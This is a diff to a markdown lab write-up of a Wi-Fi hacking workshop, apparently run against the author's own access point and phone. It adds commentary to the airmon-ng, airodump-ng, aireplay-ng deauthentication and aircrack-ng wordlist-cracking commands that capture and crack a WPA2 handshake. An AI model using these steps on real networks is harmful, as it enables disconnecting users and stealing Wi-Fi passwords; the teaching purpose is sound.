@@ -1,5 +1,7 @@
 # Wi\-Fi Hacking Workshop
 
+Summary: I will be gathering the Access Point MAC address and MAC address of my phone. I will then 
+send 10 deauthentication packets which will cause my phone to disconnect and reauthenticate to the Access Point. We then capture the authentication prcoess save it locally and crack the password
 ![](img/WifiHackingWorkshop0.png)
 
 ### Disclaimer
@@ -48,9 +50,11 @@ Add the Wireless adapter to VirtualBox
 
 ### Adapter Setup
 
-Check for conflicting processes
+sudo airmon\-ng check kill checks for conflicting processes and kills them. This howver will result in loss of internet for the VM, can be solved by restarting.
 
-Start the wireless adapter in monitor mode
+Iwconfig shows the adapter names. In my case wlan0 is the wireless adapter.
+
+sudo airmon\-ng start wlan 0 - Starts the wireless adapter in monitor mode.
 
 ![](img/WifiHackingWorkshop3.png)
 
@@ -58,23 +62,28 @@ Start the wireless adapter in monitor mode
 
 ![](img/WifiHackingWorkshop4.png)
 
-<span style="color:#000000">s</span>  <span style="color:#000000">udo airodump\-ng \-c 11 wlan0</span>
+sudo airodump\-ng \-c 11 wlan0 - discovers access points on channel 11 using wlan0
+
+BSSID is the access point MAC address of the router. In this case we are looking at the BSSID for CyberSec
 
 ### Discovering devices
+
+The MAC address of 0C:8D:CA:A6:94:8D is my phone and that is where the deauthentication packets are getting sent.
 
 ![](img/WifiHackingWorkshop5.png)
 
 ### De-Auth Attack
 
-sudo airodump\-ng \-c 11 \-\-bssid B0\-95\-75\-5C\-3B\-94 \-w psk wlan0
+sudo airodump\-ng \-c 11 \-\-bssid B0\-95\-75\-5C\-3B\-94 \-w psk wlan0 - this captures packets for the CyberSec accesspoint and saves it locally to a file named psk
 
-sudo aireplay\-ng \-0 10 \-a B0:95:75:5C:3B:94 \-c 0C:8D:CA:A6:93:8D wlan0
+sudo aireplay\-ng \-0 10 \-a B0:95:75:5C:3B:94 \-c 0C:8D:CA:A6:93:8D wlan0 - This sends 10 deauthentication packets to my phone which will disconnect from the Access Point and automatically reconnect. The reauthenication process for the wpa2 handshake is captured and saved locally
 
 ![](img/WifiHackingWorkshop6.png)
 
 ### Cracking Password
+Using the previous wpa2 handshake capture we can brute force the password using a passwordlist. I created one called passwordlist with the password of Password1 in it for lab demostration purpose. But Kali has default wordlists in the /usr/share/wordlists directory
 
-aircrack\-ng \-w passwordlist\.txt psk\-02\.cap
+aircrack\-ng \-w passwordlist\.txt psk\-02\.cap - This is what is used to crack the password.
 
 ![](img/WifiHackingWorkshop7.png)
 
